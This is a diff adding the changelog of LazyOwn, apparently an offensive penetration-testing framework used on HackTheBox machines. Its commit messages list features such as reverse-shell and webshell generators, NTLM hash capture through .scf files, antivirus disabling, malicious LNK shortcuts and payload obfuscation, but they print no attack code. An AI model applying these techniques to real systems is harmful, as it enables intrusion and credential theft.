+  *   * feature(versionamiento semantico en script de deploy): mejora en DEPLOY.sh con versionamiento semantico\n\nVersion: release/0.1.0\n\nNuevo vrsionamiento semantico en el script de depsliegue\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test of --no-test): and lolcat on clock command :P\n\nclock has now alias\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(se agrega el change log al readme): tambien se ejecutan pruebas del despliegue con el parametro --no-test\n\ncambios hechos solo en el archivo README.md\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(fix in vpn): dont work with arguments\n\nnow works xD\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Otros
+
+### Otros
+
+  *   * feature(parametrizar el despliegue): se agrega el parametro --no-test para despliegues que no involucren cambios en la tool\n\n:D\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(troubleshooting): deleting the tmp file but i cant sleep\n\nlol\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(delete qa command to option -c): bug: dont let beggin scriptfast_run_as_r00t.sh, instruction was deleted\n\nat line 6678\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(despliegue): backup file del archivo lazyown creado en las pruebas TODO: eliminar el archivo al terminar las pruebas, ahora toca saber donde lo està creadno son muchas funciones xD, aun que creoq ue es mi pequeño burpfuzzer que lo hace pero ya es tarde\n\ny no lo veré hoy\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(despliegue): de organizaciòn de archivos ovpn dentro del directorio vpn\n\ntambien se actualizo el timeout de las pruebas unitarias\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testmeneitor): probando el workflow de despliegue\n\neste es el body de la prueba de despliegue junto a testmineitor\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Otros
+
+### Otros
+
+  *   * feature(nuevo creador de index.html): crea el html de manera automatizada con el script index.sh\n\nel script realiza tareas de actualizaciòn de la pagina web\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Otros
+
+### Otros
+
+  *   * feature(mejora CHANGELOG.sh): ahora actualiza usando readmeneitor.py\n\npronto utilizarà nuestro testmeneitor para probar que no subimos codigo con bugs\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(mejorando el tipo): cambio en el script CHANGELOG.sh\n\nse mejora la descripcion de los tipos de commits\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): El cierre de una imagen en la documentación estaba mal :)\n\ntambien se modifico el CHANGELOG.sh que chulada de script\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/
+
+
+### Otros
+
+### Otros
+
+  *   * Nueva descripcion en el readme y probando el CHANGELOG.sh :)
+
+
+### Otros
+
+### Otros
+
+  *   * ahora el changelog a docs :D en formato html
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 Ahora estamos en TryHackMe :D, nuestro QA Testmeneitor.py ya es màs inteligente ya no se le olvida cerrar las tareas que abrio xD, todos los comandos nuevos estan docuemntados en docs/COMMANDS.md y docs/UTILS.md todas las funciones nuevas como copy2clip :P, y estrenamos CHANGELOG.md y CHANGELOG.sh :D  👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  pandoc README.md -f markdown -t html -s -o README.html madremia que comandazo 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  pandoc README.md -f markdown -t html -s -o README.html madremia que comandazo 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 comming soon tryhackme 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 testmeneitor.py my new qa it's new doing qa so... l:P, some commands news base64encode, base64decode, rdp, all documented by my documentator readmeneitor.py :P 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new fancy proompt :) 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 bug fixing 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 3ast3r366 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New command launchpad to recon Linux OS 👽
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #27 from grisuno/clcthulhu-patch-1
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(update readme description): change of the description; Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New Machine, New Session, New Look, New functions, New tools, New CVEs, NEW VERSION  👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 mejorando la documentaciòn 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new commands rulencode, urldecode, y lynis documented at COMMANDS.md 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 command vpn now handle multiple ovpn files 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 command vpn now handle multiple ovpn files 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new commands documented at COMMANDS.md, now implement autocomplete at hashcat, more soon :) 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  new commands documented at COMMANDS.md
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  Magicgardens is so insane but pwned :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new commands documented in COMMANDS.md or README.md and more documentation of the proyect thanks to readmineitor.py :D comming soon their own repo...
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new commands documented in COMMANDS.md or README.md and more documentation of the proyect thanks to readmineitor.py :D comming soon their own repo...
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new machine magic gardens insane machine because resource was pwned and sea not was released yet
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 bug fixing in createhash, new wrappers, chisel command updated now can choice the payload, img2cookie new payloads
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 bug fixing in createhash, new wrappers, chisel command updated now can choice the payload, img2cookie new payloads
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 some love to readme
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 some love to readme
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 some love to readme
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new tools for pwntomate :D
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new command img2cookie :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new command img2cookie :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new machine comprezzor.htb
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new script readmeneitor req updated
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new script readmeneitor to help me update the readme xD
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new command ssh 22 and if u have file sessions/credentials.txt this will open ssh conection :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 bug fixing and replace command nc with pwncatcs more fancy and sharp :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 bug fixing in wfuzz sub command wen you not pass the domain
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 some changes in nmap script now discovery have template html too and we have a little index2.html to navigate the reports.
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 some littles changes :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new machine compiled :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new command disableav to create a aav.vbs to disable av if it's possible :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 changing the command in venom :)
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 holly jissus mist.htb now pwned with my user :P its rally insane amount of work to pwn
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 holly jissus mist.htb machine cost to me one week and my mental health xD bu it's pwned xD
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 todo readme ...
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 update gitignore ...
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 chisel fix copy to clipboard commad bug ...
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 command list to update the readme: todo ...
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 no more prints ( 👽 we have 13 xD) now we have technologì we have print_msg, print_error & print_warn :) so much pretty
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 better prints 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 conptyshell better 👽
+
+
+### Otros
+
+### Otros
+
+  *   * 👽 new brothers commands, LazyOwn> winbase64payload  and asprevbase64 👽
+
+
+### Otros
+
+### Otros
+
+  *   * some roder to prints, not finished yet but the storm its cut the electricity so commit....
+
+
+### Otros
+
+### Otros
+
+  *   * feat: somo testing and alias now you can run gpt alias :D
+
+
+### Otros
+
+### Otros
+
+  *   * feat: Now the GPT Client use Llama 70B and now can hack :) fixing error path from json files :P
+
+
+### Otros
+
+### Otros
+
+  *   * feat: Now the GPT Client use Llama 70B and now can hack :)
+
+
+### Otros
+
+### Otros
+
+  *   * feat: more time to the nmap to finished and pyautomate autostart
+
+
+### Otros
+
+### Otros
+
+  *   * feat: New stylesheet for Nmap reports, making them more professional and including links to CVEs according to the version of banner services and supper fast automate auto run script as fast_run_as_r00t.sh, demo soon
+
+
+### Otros
+
+### Otros
+
+  *   * Create sessions.sh
+
+
+### Otros
+
+### Otros
+
+  *   * some new attacks exploits and new menu to download resources and exploits :D new msf autoroute :D
+
+
+### Otros
+
+### Otros
+
+  *   * some new attacks exploits and new menu to download resources adn exploits :D
+
+
+### Otros
+
+### Otros
+
+  *   * some new attacks
+
+
+### Otros
+
+### Otros
+
+  *   * some ideas
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 command smbserver now create file.scf to generate a attackto the victim try to charge an iccon from our smbserver and the hash is ours
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command getnpusers
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅 alias auto.
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅 alias auto.
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅. jejejjejej
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now with pwntomate to automate with the command pyautomate
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now command nmap or run lazynmap has a html and xml reports to more pleasssure. xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command chisel to run chisel as server before run download_resource command
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 socat command to use proxychains :D and better msf rev now with argument [win|win64|lin|lin64|mac|mac64] and command msf lnk [win|win64] to perform a malicious shortcut lnk attack with msfvenom
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some format....
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 ...
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 fix arguments little bug
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 fix arguments little bug
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new arguments :) -c command ex ping
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new aliases :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now options like --help, -v and --no-banner :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :) now in white xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 newhashcat
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new comands conptyshell better command nc noew with tty treatment createhash better now with recognice automate download_resource
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 another account and i noob again bu i steel playing insane mist machine and if not unban so i can unlck my writeups and spoiler spoiler spoiler alert xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 was banned from htb to spoiler jajjajaj xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 msf command
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 scripts to try attac cammeras not work with my cammera yet xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 scripts to try attac cammeras not work with my cammera yet xD
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ignorearp ignoreicmp acknowledgearp acknowledgeicmp ports cports
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 clean command to clean up the mess and pwn the next machine :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz commands pwd, sh
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz command now search subdomains with wfuzz sub domain.htb new commands nc, vpn, rev, banner :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New Colors :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding run script to run lazyown with virtual env activated to avoid errors
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to exit as q :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to commands its una shulada
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to list command :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love in form of colored strings :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to some prints :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command py3ttyup to upgrade to tty your rev shell :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ip www to show ips and start webserver at sessions directory where lazyown dump scripts like revertshells, webshells, etc. and some fixperms :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ip www to show ips and start webserver at sessions directory where lazyown dump scripts like revertshells, webshells, etc.
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 solarlab pwned :D new machine MagicGardens
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine solarlab :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new revshell.c and machine powned xD axlle hard
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands createrevshell y createwinrevshell
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 FormulaX pwned :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer Pwned :P new new new FormulaX :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Skyfall Linux insane machine, Blazorized was powned :D
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Blazorized.htb
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb pwned
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new tool in external :) https://github.com/BloodHoundAD/SharpHound.git :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine Blazorized.htb :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command to copy the exploits from exploitdb use cp relative/path/show/in/searchexploit when you use the flag -x :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command dsnmap :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New machine Runner.htb
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) new resources in sessions, new module lazypsexec bruteforce :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) samrdump
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 news script bruteforce on modules :) :)
+
+
+### Otros
+
+### Otros
+
+  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command dnsenum :)
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new command dig
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new command dig
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new commands :)
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyproxy.py
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new commands :) to se use tab tab or ?
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new payloads in sessions directory :) :) :)
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new exploits :)
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new command run lazywerkzeugdebug
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429
+
+
+### Otros
+
+### Otros
+
+  *   * join to our team https://app.hackthebox.com/teams/overview/6429
+
+
+### Otros
+
+### Otros
+
+  *   * news exploits
+
+
+### Otros
+
+### Otros
+
+  *   * new hashcat :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command dirsearch :D
+
+
+### Otros
+
+### Otros
+
+  *   * new proxy better :D
+
+
+### Otros
+
+### Otros
+
+  *   * new commands createhash, createwebshell, sqlmap, proxy, john2hash
+
+
+### Otros
+
+### Otros
+
+  *   * little discover .sh
+
+
+### Otros
+
+### Otros
+
+  *   * Create internal_discover.sh
+
+
+### Otros
+
+### Otros
+
+  *   * 1 new exploit
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * 2 new exploit external :D working like a charm
+
+
+### Otros
+
+### Otros
+
+  *   * new exploit werkzeug in debug mode lettle retocated to run in python3 from searchsploit :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command: exploits externals :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command: smbmap whattomap ex: smbmap tmp :D
+
+
+### Otros
+
+### Otros
+
+  *   * go buster new parameter url to use url from payload not rhost
+
+
+### Otros
+
+### Otros
+
+  *   * parameter added to gospider url to use var url in payload not rhost and add the command addhost host.ext to add the domain with rhost parameter to /etc/hosts not now to windows sistems sorry
+
+
+### Otros
+
+### Otros
+
+  *   * refactor global var rhost deleted other ones
+
+
+### Otros
+
+### Otros
+
+  *   * path hijacking add line to temp bash script
+
+
+### Otros
+
+### Otros
+
+  *   * new command: gospider :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command: gobuster :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command: wfuzz :D and you can add example a hide line option like # wfuzz --hl=9 to hide responses with long line to 9
+
+
+### Otros
+
+### Otros
+
+  *   * new command: run lazyssh77enum to enum using a wordlist and exploit foound searchsploit as openssh 7.7
+
+
+### Otros
+
+### Otros
+
+  *   * new command: whatweb :D
+
+
+### Otros
+
+### Otros
+
+  *   * new command: psexec :D
+
+
+### Otros
+
+### Otros
+
+  *   * smbclient command and exploit to enum ssh i used in a machine of hackthebox to enum, i upload because i was lazy and dont deleted before xD
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #22 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * mariadb rce :)
+
+
+### Otros
+
+### Otros
+
+  *   * new command getseclist :D
+
+
+### Otros
+
+### Otros
+
+  *   * payload.json to play on hackthebox :D
+
+
+### Otros
+
+### Otros
+
+  *   * port a python del exploit archiconocido de meta exploit vsftpd 3.0.3
+
+
+### Otros
+
+### Otros
+
+  *   * shell payload in python generated by msfvenom automated by lazyown framework ;)
+
+
+### Otros
+
+### Otros
+
+  *   * new commit to check if alsr is activated in the kernel
+
+
+### Otros
+
+### Otros
+
+  *   * deleted shells generated by the script
+
+
+### Otros
+
+### Otros
+
+  *   * upx to shells generated by msfvenom automated by lazyown framework ;)
+
+
+### Otros
+
+### Otros
+
+  *   * new comand arpscan
+
+
+### Otros
+
+### Otros
+
+  *   * new path to diccionary to run by default in parrot
+
+
+### Otros
+
+### Otros
+
+  *   * new gitignore
+
+
+### Otros
+
+### Otros
+
+  *   * cambios en el miniburp
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update install.sh
+
+
+### Otros
+
+### Otros
+
+  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
+
+
+### Otros
+
+### Otros
+
+  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
+
+
+### Otros
+
+### Otros
+
+  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
+
+
+### Otros
+
+### Otros
+
+  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
+
+
+### Otros
+
+### Otros
+
+  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)
+
+
+### Otros
+
+### Otros
+
+  *   * lazymitmap.py
+
+
+### Otros
+
+### Otros
+
+  *   * lazymitmap.py
+
+
+### Otros
+
+### Otros
+
+  *   * lazymitmap.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazycurl.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * lazycurl.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update install.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #21 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update CNAME
+
+
+### Otros
+
+### Otros
+
+  *   * Update install.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Create CNAME
+
+
+### Otros
+
+### Otros
+
+  *   * metatags to seo
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy ntlmv2 firstaproach using in hashes.txt the ouput smbserver command when the conection is established
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy .gitignore
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy get smbserver with impacket :) and then you can sudo impacket-smbserver smbfolder /home/gris/tools/LazyOwn -smb2support with simple smbserver in LazyOwn console
+
+
+### Otros
+
+### Otros
+
+  *   * LAzy get capabilities :P
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn FTP sniff prety messages :)
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn keygen to generate keys to use in payload.json to cypher the conections
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn smbrelay
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn http sniff :( not working fine yet
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn ftp sniff :)
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn README
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn ArpSpoofing README and banner :P [;,;]
+
+
+### Otros
+
+### Otros
